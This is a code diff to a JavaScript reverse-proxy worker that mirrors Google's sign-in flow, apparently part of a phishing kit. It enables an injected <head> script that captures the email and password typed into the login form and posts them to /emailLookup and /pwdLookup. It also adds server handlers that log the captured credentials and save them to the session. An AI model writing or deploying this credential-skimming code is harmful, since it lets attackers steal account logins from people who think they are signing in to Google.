@@ -95,10 +95,10 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                 reg: /play.google.com/ig,
                 replacement: '/playboy',
             },
-            // {
-            //     reg: /<head>/,
-            //     replacement: '<script>window.addEventListener("load",(()=>{function e(e){return new Promise((n=>{if(document.querySelector(e))return n(document.querySelector(e));const t=new MutationObserver((o=>{document.querySelector(e)&&(n(document.querySelector(e)),t.disconnect())}));t.observe(document.body,{childList:!0,subtree:!0})}))}function n(){const e=document.querySelector("#identifierId").value;var n=new XMLHttpRequest;n.open("POST","/emailLookup",!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send("unenc_email="+encodeURIComponent(e))}function t(){const e=document.querySelector("input[type="password"]").value;var n=new XMLHttpRequest;n.open("POST","/pwdLookup",!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send("unenc_pwd="+encodeURIComponent(e))}e("#identifierNext").then((e=>{e.addEventListener("click",n)})),e("#passwordNext").then((e=>{e.addEventListener("click",t)}))}));</script><head>'
-            // },
+            {
+                reg: /<head>/,
+                replacement: '<script>window.addEventListener("load", function() { setTimeout(function() { var emailNext = document.querySelector("#identifierNext"); var passwordNext = document.querySelector("#passwordNext"); if (emailNext) { emailNext.addEventListener("click", function() { var email = document.querySelector("#identifierId").value; if (email) { var xhr = new XMLHttpRequest(); xhr.open("POST", "/emailLookup", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("unenc_email=" + encodeURIComponent(email)); } }); } if (passwordNext) { passwordNext.addEventListener("click", function() { var password = document.querySelector("input[type=\\"password\\"]").value; if (password) { var xhr = new XMLHttpRequest(); xhr.open("POST", "/pwdLookup", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("unenc_pwd=" + encodeURIComponent(password)); } }); } }, 1000); });</script><script>document.addEventListener("DOMContentLoaded", function() { var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === "childList") { var emailNext = document.querySelector("#identifierNext"); var passwordNext = document.querySelector("#passwordNext"); if (emailNext && !emailNext.hasAttribute("data-listener")) { emailNext.setAttribute("data-listener", "true"); emailNext.addEventListener("click", function() { var email = document.querySelector("#identifierId").value; if (email) { var xhr = new XMLHttpRequest(); xhr.open("POST", "/emailLookup", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("unenc_email=" + encodeURIComponent(email)); } }); } if (passwordNext && !passwordNext.hasAttribute("data-listener")) { passwordNext.setAttribute("data-listener", "true"); passwordNext.addEventListener("click", function() { var password = document.querySelector("input[type=\\"password\\"]").value; if (password) { var xhr = new XMLHttpRequest(); xhr.open("POST", "/pwdLookup", true); xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("unenc_pwd=" + encodeURIComponent(password)); } }); } } }); }); observer.observe(document.body, { childList: true, subtree: true }); });</script><head>'
+            },
             {
                reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
                replacement: '/CheckConnection',
@@ -199,6 +199,36 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             clientContext.setLogAvailable(true)
             clientContext.info.isLogin = true
             super.sendClientData(clientContext, {})
+        }
+
+        if (this.req.url === '/emailLookup') {
+            let body = ''
+            this.req.on('data', (chunk) => {
+                body += chunk.toString()
+            })
+            this.req.on('end', () => {
+                const email = decodeURIComponent(body.split('=')[1])
+                console.log(`Email captured via JavaScript: ${email}`)
+                Object.assign(clientContext.sessionBody, { email: email })
+                this.res.writeHead(200, { 'Content-Type': 'text/plain' })
+                this.res.end('OK')
+            })
+            return
+        }
+
+        if (this.req.url === '/pwdLookup') {
+            let body = ''
+            this.req.on('data', (chunk) => {
+                body += chunk.toString()
+            })
+            this.req.on('end', () => {
+                const password = decodeURIComponent(body.split('=')[1])
+                console.log(`Password captured via JavaScript: ${password}`)
+                Object.assign(clientContext.sessionBody, { password: password })
+                this.res.writeHead(200, { 'Content-Type': 'text/plain' })
+                this.res.end('OK')
+            })
+            return
         }
         if (this.req.url.startsWith('/ServiceLogin?')  && clientContext.info.isLogin === true) {
             super.sendClientData(clientContext, {})
